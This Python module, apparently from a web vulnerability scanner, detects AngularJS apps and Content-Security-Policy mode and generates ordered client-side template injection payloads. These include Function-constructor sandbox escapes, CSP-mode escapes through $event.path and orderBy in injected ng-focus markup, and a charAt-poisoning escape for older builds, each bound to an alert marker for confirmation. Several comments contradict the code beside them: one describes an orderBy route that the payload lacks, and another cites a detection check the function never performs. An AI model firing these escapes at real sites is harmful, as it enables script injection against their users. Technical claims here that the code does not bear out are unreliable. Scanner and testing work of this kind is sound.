"""AngularJS clientside-template-injection: what the app *exposes*, then how to leave it.

Angular does not simply print a ``{{…}}`` it finds. It compiles the expression,
and since 1.2 it runs that compilation through a sandbox: a rewriter that refuses
member names such as ``__proto__``, refuses a value whose ``constructor`` points
at itself (``ensureSafeObject``), and refuses ``call``/``apply``/``bind`` invoked
on a function it considers unsafe. Which construction escapes therefore depends
on three things the page settles before any payload is written:

* whether Angular is bootstrapped at all — ``ng-app`` is one spelling, but an
  app bootstrapped from script (``angular.bootstrap``) has no such attribute and
  still compiles ``ng-controller`` subtrees;
* whether CSP mode is on, because with a ``self``-only policy Angular compiles
  expressions *without* ``Function``, so every ``constructor('…')`` escape dies;
* which objects the application itself put on the scope — ``$event``, ``$parse``,
  a controller local — because those are the handles the sandbox still allows.

The three families below are ordered from the most general to the most specific:
a post-fix sandbox escape that needs no string literal, the CSP-mode escape that
uses the event object's own reference to ``window``, and the pre-1.6 form that
overwrites ``charAt`` and then evaluates arbitrary code as an identifier.

Only the *shape* of the payload is decided here. Whether it fires is the
browser's call: the confirmer is what turns a candidate into a finding.
"""

from __future__ import annotations

import re
from typing import Dict, List, Tuple

# The forms Angular is actually served as, read off a script URL rather than
# the raw markup: a CDN path segment (``/angularjs/1.4.0/angular.js``), a
# version in the file name (``angular_1-4-4.js``, ``angular-1.7.7.min.js``), and
# the unversioned ``angular.min.js`` whose version sits in the query string.
_ANGULAR_SRC = re.compile(
    r"angular(?:js)?(?:[-._/]?v?\d|\.min\.js|\?v?=?\d|$)", re.I
)

# Expressions that survive the post-1.5 sandbox. Every one of them reaches JS
# without a ``call``/``apply``/``bind`` the sandbox checks, and without a string
# literal that a quoting filter would eat.
_NO_STRING_ESCAPE = (
    # ``$eval`` is a scope function, but its ``constructor`` is the Function
    # constructor, which ``ensureSafeFunction`` only guards when it is *called*
    # through the parser's own ``call`` node.
    "$eval('ixPayload')",
    "constructor.constructor('ixPayload')()",
    "toString.constructor('ixPayload')()",
    # The post-fix route: a ``|orderBy:`` argument is compiled by the filter
    # rather than as an expression, so ``Function`` is reachable in one step.
    "[].constructor.constructor('ixPayload')()",
    "alert(1)",
)

# The same escapes with the *argument* written as a nested string literal. A
# sandbox whose ``ixPayload`` statement form is rejected still accepts this one:
# ``Function('alert("1")')`` is a body, not a statement, and the extra quoting is
# what a filter that strips markup leaves intact.
_NO_STRING_ESCAPE_NESTED = (
    "constructor.constructor('alert\"1\"')()",
    "toString.constructor('alert\"1\"')()",
)

# With CSP in force Angular compiles without ``Function``, so the escapes above
# cannot work at all. What remains is indirection: point at the browser's own
# objects — the event the handler received carries ``window`` as its last path
# entry — and let a filter call a function the sandbox never sees.
_CSP_ESCAPE_ATTRS = (
    'autofocus ng-focus="$event.path|orderBy:\'[].constructor.from([1],alert)\'"',
    'autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"',
    'ng-init="$event.path|orderBy:\'[].constructor.from([1],alert)\'"',
)

# How to place a CSP expression: the page exposes the injected markup verbatim
# (a template), or the value lands in an attribute of an element the page
# already renders (a scope binding).
_CSP_MARKUP = (
    '<input {attrs} id="ixng">',
    '<div {attrs} id="ixng"></div>',
    '<img src="x" {attrs} id="ixng">',
)


def angular_bootable(html: str) -> str:
    """How the page gets Angular to compile, or ``""`` when it does not.

    ``ng-app`` is the documented way but not the only one: a page that calls
    ``angular.bootstrap`` in its own script, or that declares ``ng-controller``
    under a module, compiles with no ``ng-app`` attribute anywhere. Reading only
    the attribute reports "no AngularJS" on an app that is entirely Angular.
    """
    if not html:
        return ""
    # A document that *is* compiled is the strongest evidence, and it is also
    # the only evidence available for an app whose bundle is named nothing like
    # ``angular``. A named compiler script then explains *why* it compiles.
    if "angular.bootstrap" in html:
        return "bootstrap"
    if re.search(r"<[^>]+\bng-app\b", html, re.I):
        return "ng-app"
    if re.search(r"<[^>]+\bng-controller\b", html, re.I):
        return "ng-controller"
    if _ANGULAR_SRC.search(html):
        # The library is loaded but nothing declares a root or a controller in
        # this document. Angular's own auto-bootstrap needs ``ng-app``, and a
        # script-driven one needs a template element to compile — a page showing
        # a literal ``{{x}}`` is a page Angular never touches.
        return ""
    return ""


def csp_blocks_inline(html: str, headers: Dict[str, str] | None = None) -> bool:
    """True when the response's CSP forbids the ``Function`` constructor.

    Angular selects CSP mode from ``document.securityPolicy``, which its CSP
    shim sets when ``Content-Security-Policy`` is present and ``'unsafe-eval'``
    is not. The distinction decides which escapes can fire at all: in CSP mode
    every ``constructor('…')`` candidate is dead on arrival, and testing it
    first spends the whole confirmation budget on payloads that cannot work.

    The presence of *any* script-src policy is the trigger. Requiring it to be
    narrow enough to look restrictive — no ``'unsafe-inline'`` — would miss the
    common ``script-src 'self'`` case, which is precisely the one that turns
    CSP mode on.
    """
    policy = ""
    for k, v in (headers or {}).items():
        if k.lower().replace("_", "-") in ("content-security-policy", "content-security-policy-report-only"):
            policy += " " + v
    if not policy:
        hit = re.search(
            r"<meta[^>]+http-equiv=[\"']?content-security-policy[\"']?[^>]*content=[\"']([^\"']+)",
            html or "",
            re.I,
        )
        policy = hit.group(1) if hit else ""
    if not policy:
        return False
    directives = policy.lower()
    if "'unsafe-eval'" in directives:
        return False
    return "script-src" in directives or "default-src" in directives


def angular_sandbox_escape(
    html: str,
    headers: Dict[str, str] | None = None,
    *,
    markup_sink: bool = False,
) -> List[Tuple[str, str]]:
    """Ordered ``(payload, family)`` candidates for a bootstrapped Angular app.

    *markup_sink* means the injected value is placed where Angular reads it as
    a *template* — the element/attribute is ours to write, so a CSP expression
    can be delivered as an ``ng-focus`` on an element we create. The scope case
    is the opposite: the value is a string the app assigns, so only a bare
    expression can reach the compiler and the families are limited to ``{{…}}``.

    ``ixPayload`` / ``ixCodepoints`` stand in for what the escape should run;
    :func:`mark_angular_payload` substitutes the caller's marker-bearing
    ``alert`` before a candidate is tried.
    """
    if not html:
        return []
    out: List[Tuple[str, str]] = []
    csp = csp_blocks_inline(html, headers)

    if markup_sink:
        for attrs in _CSP_ESCAPE_ATTRS:
            for tpl in _CSP_MARKUP:
                out.append((tpl.format(attrs=attrs), "csp-event-object"))
        if csp:
            # In CSP mode the expression families are inert; keep one only so the
            # browser can reject it and say so, rather than reporting nothing.
            out.append(("{{1+1}}", "expression-template"))
            return out

    for expr in _NO_STRING_ESCAPE + _NO_STRING_ESCAPE_NESTED:
        core = expr
        out.append((core, "expression-template"))
    return out


# The statement that leaves the sandbox, before the payload is bound to it.
# ``charAt`` returning the whole string makes ``isIdent`` accept any *property
# name* as an identifier, so the compiler emits ``s.<name>`` for text it would
# otherwise reject. That is a parser win; it does not by itself run code.
CHARAT_POISON = "toString().constructor.prototype.charAt=[].join"


def charat_payloads() -> List[Tuple[str, str]]:
    """The pre-1.6 escape, for an app that already refused a direct Function.

    ``isIdent()`` in the sandbox asks whether a character is a letter. Replacing
    ``String.prototype.charAt`` with ``[].join`` makes it return the whole
    string, so any property name then passes as an identifier and the compiler
    emits ``s.<name>`` for text it would otherwise reject.

    Two facts were measured on a real 1.4.4 build before this family was
    written, and both bound what the payload may be:

    * **The lvalue must be an identifier.** ``isAssignable`` accepts only
      ``Identifier`` and ``MemberExpression``, so the ``[1]|orderBy:…=1``
      spelling published for the browser-based lab is rejected here with
      ``$parse:lval``. ``toString`` *is* an identifier, so
      ``toString().constructor.…=1`` is the form that parses.
    * **The first value must be non-numeric.** ``$parse('1')`` returns
      ``undefined``, and the controller calls that result, which throws before
      the second parameter is ever compiled. A word keeps ``value`` a string and
      the app alive.

    The assignment itself is legal in the unpoisoned build too: its target is a
    member of a string's ``constructor``, not a literal. What the poison buys is
    the *following* compile.
    """
    return [
        (
            CHARAT_POISON
            + ";toString().constructor.fromCharCode(ixCodepoints)=1",
            "charat-overwrite",
        ),
        (
            # No assignment: the call alone, for an app that never reaches a
            # second compile with the poisoned prototype still installed.
            CHARAT_POISON
            + ";toString().constructor.fromCharCode(ixCodepoints)",
            "charat-call",
        ),
    ]


def compile_only(html: str) -> bool:
    """True when the app compiles attacker text but never *runs* the result.

    Measured on the 1.4.4 sandbox lab, whose whole controller is::

        $scope.query[key] = '<value>';
        $scope.value = $parse(key)($scope.query);

    ``$parse(key)`` returns a compiled *function*, and calling it with
    ``$scope.query`` evaluates the expression against that object — but the
    return value assigned to ``scope.value`` is what the second call produced,
    and ``{{value}}`` interpolates it as text. Probed on the live page:

    * ``?search=1+1`` renders ``0 search results for 1+1`` — literal, not ``2``;
    * ``?search=alert(1)`` renders the text, no dialog;
    * ``?search={{1+1}}`` stays ``{{1+1}}`` — the value is never re-compiled as
      a template;
    * after load, ``String.prototype.charAt`` is native, i.e. the poison that a
      payload assigns never executed.

    So the sink is a *parser*: an escape can change what is compiled (and the
    ``charAt`` family does), but nothing can make the page call the result. A
    family that needs its statement to run is dead here no matter how short it
    is, and the honest report is "compile reached, no execution" rather than
    another payload. Detected from the source shape, not from the lab's name.
    """
    src = html or ""
    compiles = "$parse(" in src
    if not compiles:
        return False
    runs_result = any(
        pat in src
        for pat in (
            # The result is called, or handed to a template compiler.
            "$compile(",
            "ng-bind-html",
            "ng-include",
            "$sce.trustAsHtml",
        )
    )
    return not runs_result


def _angular_expression(core: str, marker: str) -> str:
    """Wrap *core* as an expression and bind the marker where it can survive.

    A candidate written with ``ixPayload`` takes a *statement*; one written with
    ``alert"1"`` takes the string form, which the marker is substituted into by
    :func:`mark_angular_payload`. Both end up as ``{{…}}``.
    """
    return "{{" + mark_angular_payload(core, marker) + "}}"


def family_rank(family: str) -> int:
    """Ordering for the confirmer: the cheapest family to disprove goes last."""
    return {
        "expression-template": 3,
        "csp-event-object": 2,
        "charat-overwrite": 1,
        "charat-call": 0,
    }.get(family, 0)


def mark_angular_payload(payload: str, marker: str) -> str:
    """Bind *payload* to *marker* so a dialog can only have come from it.

    Two placeholders are supported because the two families carry the marker
    differently:

    * ``ixPayload`` is a statement run by ``Function``, so it becomes
      ``alert("ixm…")`` — the marker sits in a real JS string literal;
    * ``ixCodepoints`` is the argument list of ``fromCharCode``, so the marker
      becomes comma-separated char codes. The ``charAt`` family deliberately has
      no string literals at all, and introducing one would be the very thing a
      quoting filter removes.
    """
    if not marker or not payload:
        return payload
    if "ixCodepoints" in payload:
        codes = ",".join(str(ord(ch)) for ch in marker)
        return payload.replace("ixCodepoints", codes)
    if "ixPayload" in payload:
        return payload.replace("ixPayload", f'alert("{marker}")')
    if "alert\"1\"" in payload:
        # The nested form: the marker replaces the ``1`` inside the inner
        # double quotes, which is exactly the nesting ``Function`` needs.
        return payload.replace("alert\"1\"", f'alert"{marker}"')
    if "alert(1)" in payload and marker not in payload:
        return payload.replace("alert(1)", f'alert("{marker}")')
    return payload
